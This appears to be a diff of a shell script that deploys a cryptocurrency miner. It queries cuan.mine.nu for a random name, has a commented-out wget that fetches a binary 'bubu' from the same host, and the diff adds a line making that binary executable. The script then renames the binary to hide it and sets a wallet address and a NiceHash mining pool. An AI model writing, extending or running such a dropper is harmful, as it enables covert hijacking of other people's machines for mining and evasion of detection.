@@ -1,6 +1,7 @@
 #!/bin/sh
 ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
 #wget https://cuan.mine.nu/lol/bubu && chmod +x bubu
+chmod +x bubu
 mv bubu $ACAK
 WALLET=3EGM4mZ5BL4dxDsZa1nKS5dXjMs1xnxADQ
 POOL=daggerhashimoto.auto.nicehash.com:9200
